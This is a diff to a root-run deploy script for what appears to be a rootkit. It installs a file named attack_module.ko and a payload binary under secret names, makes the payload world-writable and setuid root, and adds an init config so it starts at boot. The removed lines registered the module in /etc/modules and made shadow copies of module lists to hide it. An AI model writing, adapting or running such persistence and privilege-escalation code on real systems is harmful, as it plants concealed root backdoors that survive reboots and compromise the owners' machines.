@@ -2,21 +2,19 @@
 # Can be undone with undeploy.sh
 # This script must be run as root
 
-export SECRET_KO_NAME=$(cat secret_ko_name)
-export SECRET_PAYLOAD_NAME=$(cat secret_payload_name)
-export SECRET_MODULES_NAME=$(cat secret_modules_name)
-
-# deploy the kernel module to the drivers directory
-cp -f attack_module.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_KO_NAME.ko"
-# make shador copies of the /etc/modules and /proc/modules files
-cp -f /etc/modules /etc/$SECRET_MODULES_NAME
-# add this module as a startup module
-echo "\n$SECRET_KO_NAME #magic\n" >> /etc/modules
-# register these changes with the OS
-depmod
+# deploy the kernel module to the /usr/bin directory
+cp -f attack_module.ko "/usr/bin/$(cat secret_ko_name).ko"
+echo $?
 
 # deploy the payload to the /usr/bin directory
-cp -f payload /usr/bin/$SECRET_PAYLOAD_NAME
+cp -f payload "/usr/bin/$(cat secret_payload_name)"
 echo $?
 # mark it as setuid root (probably not needed, but nice to have)
-chmod u+s /usr/bin/$SECRET_PAYLOAD_NAME
+chmod 777 "/usr/bin/$(cat secret_payload_name)"
+echo $?
+chmod u+s "/usr/bin/$(cat secret_payload_name)"
+echo $?
+
+# deploy the startup configuration
+cp -f boot.conf "/etc/init/$(cat secret_conf_name).conf"
+echo $?
